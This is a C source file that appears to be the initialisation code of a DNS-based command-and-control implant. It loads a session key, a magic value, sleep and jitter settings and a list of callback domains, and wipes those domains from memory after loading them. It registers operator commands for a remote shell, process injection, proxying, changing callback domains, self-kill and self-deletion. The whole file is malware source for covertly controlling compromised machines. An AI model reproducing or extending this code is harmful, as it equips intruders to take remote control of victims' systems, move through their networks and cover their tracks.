#include "Macro/Macro.h"
#include "Debug.h"
#include "Core/Tasks/Tasks.h"
#include  "Core/Initialiser.h"
#include  "Hams.h"
#include "Support/Memory.h"
#include "Transport/DNS.h"
#include "Core/Tasks/Modules/Accessory.h"
#include  "Config.h"

#define DomainSize 255

char SessionID[]=SessionIDM;
char Key[]=KeyM;
//char C2Domains[C2DomainsCountM][255] = {C2Domain1M, C2Domain2M};
char C2Domains[C2DomainsCountM][DomainSize] = {C2AllDomains};
char MagicValue[] = MagicValueM;
int  SleepTime=SleepM;
int  jetter=JitterM;
int  C2DomainsCount=C2DomainsCountM;

// Always Check Size of funclistName & funclistPtr // Crash  .6.
int FunctionMaker()
{
  int i = 0;
  funclistName[i] = ChangeSleepCodeTA; // 5
  funclistPtr[i] = ChangeSleep_ID_5;
  i++;
  funclistName[i] = MacroShellCodeTA; // 6
  funclistPtr[i] = Shell_ID_6;
  i++;
  funclistName[i] = MacroInjectCodeTA; // 17
  funclistPtr[i] = Inject_ID_17;
  i++;
  funclistName[i] = MacroStartProxyCodeTA; // 12
  funclistPtr[i] = StartProxy_ID_12;
  i++;
  funclistName[i] = MacroStopProxyCodeTA; // 14
  funclistPtr[i] = StopProxy_ID_14;
  i++;
  funclistName[i] = MacroNewCallBackDomainCodeTA; // 18
  funclistPtr[i] = AddNewCallBackDomain_ID_18;
  i++;
  funclistName[i] = MacroDeleteCallBackDomainCodeTA; // 20
  funclistPtr[i] = DeleteCallBackDomain_ID_19;
  i++;
  funclistName[i] = MacroListAllActiveDomainsStrTA; // 20
  funclistPtr[i] = ListAllActiveDomains_ID_22;
  i++;
  funclistName[i] = MacroSelfKillTA; // 16
  funclistPtr[i] = SelfKill_ID_16;
  i++;
  funclistName[i] = MacroSelfDelTA; // 15
  funclistPtr[i] = SelfDel_ID_15;
  i++;

  
}

int  InitialisCallBackDomain(){

    Hams->C2Domains = (DomainList*)malloc(sizeof(DomainList));
    Hams->C2Domains->head = NULL;
    Hams->C2Domains->currentNode = NULL;
    Hams->C2DomainsCount = 0;
    return 1;
}

int Initialiser()
{

Hams=(HamsInfo*)HMalloc(sizeof(HamsInfo));
InitialisCallBackDomain();
Hams->SessionID=SessionID;
Hams->Key=Key;
for(int i=0;i<C2DomainsCount;i++){
  addDomainName(C2Domains[i]);
  DPRINT("Next domain:%s %s\n", C2Domains[i],getNextDomain());
  memset(C2Domains[i],0,DomainSize);
  DPRINT("Next domain:%s %s\n", C2Domains[i],getNextDomain()); 
}
Hams->MagicValue=MagicValue;
Hams->Sleep=SleepTime;
Hams->Jetter=jetter;
ExtractDNSServerAddress();
FunctionMaker();



}